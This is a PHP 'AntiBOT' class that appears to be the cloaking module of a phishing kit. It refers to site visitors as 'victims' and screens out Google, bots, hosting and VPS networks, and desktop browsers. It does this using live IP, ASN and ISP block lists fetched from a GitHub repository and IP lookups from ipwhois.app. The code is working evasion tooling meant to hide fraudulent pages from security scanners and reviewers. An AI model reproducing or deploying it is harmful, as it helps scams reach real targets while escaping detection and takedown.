<?php


class AntiBOT {
    private $only_mobile;
    private $victim_ip;
    private $victim_data;
    private $useragent_class;

    function __construct($only_mobile, $ip, $useragent)
    {
        $this->only_mobile = $only_mobile;
        $this->victim_ip = $ip;
        $this->victim_data = $this->getIpDetails();
        $this->useragent_class = $useragent;
    }

    public function getIpDetails()
    {
        $ipDetails = json_decode(file_get_contents("https://ipwhois.app/json/" . $this->victim_ip), true);
        return $ipDetails;
    }

    public function isIpBlocked()
    {
        $ipsList = file_get_contents("https://raw.githubusercontent.com/shadedev0/random/main/ips.txt");

        if (strpos($ipsList, $this->victim_ip) !== false)
        {
            return true;
        }

        return false;
    }

    public function isAsnBlocked()
    {
        $asnList = file_get_contents("https://raw.githubusercontent.com/shadedev0/random/main/asn.txt");

        if (strpos($asnList, $this->victim_data['asn']) !== false)
        {
            return true;
        }

        return false;
    }

    public function isIspBlocked()
    {
        $ispList = file_get_contents("https://raw.githubusercontent.com/shadedev0/random/main/isp.txt");

        if (strpos($ispList, $this->victim_data['isp']) !== false)
        {
            return true;
        }

        return false;
    }

    public function isOrgNameSuspicious()
    {
        $blocked_names = ['Server', 'Hosting', 'Dedicated', 'VPS'];

        foreach($blocked_names as $name)
        {
            if (strpos($this->victim_data['org'], $name) !== false) {
                return true;
            }
        }

        return false;
    }
    
    public function isDnsBlocked()
    {
        $blocked_names = ['google', 'bot'];

        $domain = gethostbyaddr($this->victim_ip);

        foreach($blocked_names as $name)
        {
            if (strpos($domain, $name) !== false) {
                return true;
            }
        }

        return false;
    }

    public function isBot()
    {
        if($this->only_mobile && !$this->useragent_class->isMobile())
        {
            return "MOBILE_ONLY";
        }

        if($this->isAsnBlocked())
        {
            return "ASN_BLOCKED";
        }

        if($this->isOrgNameSuspicious())
        {
            return "ORG_BLOCKED";
        }

        if($this->useragent_class->isRobot())
        {
            return "UA_BLOCKED";
        }

        if(function_exists('gethostbyaddr') && $this->isDnsBlocked())
        {
            return "DNS_BLOCKED";
        }

        if($this->isIpBlocked())
        {
            return "IP_BLOCKED";
        }
        if($this->isIspBlocked())
        {
            return "ISP_BLOCKED";
        }

        return "";
    }
}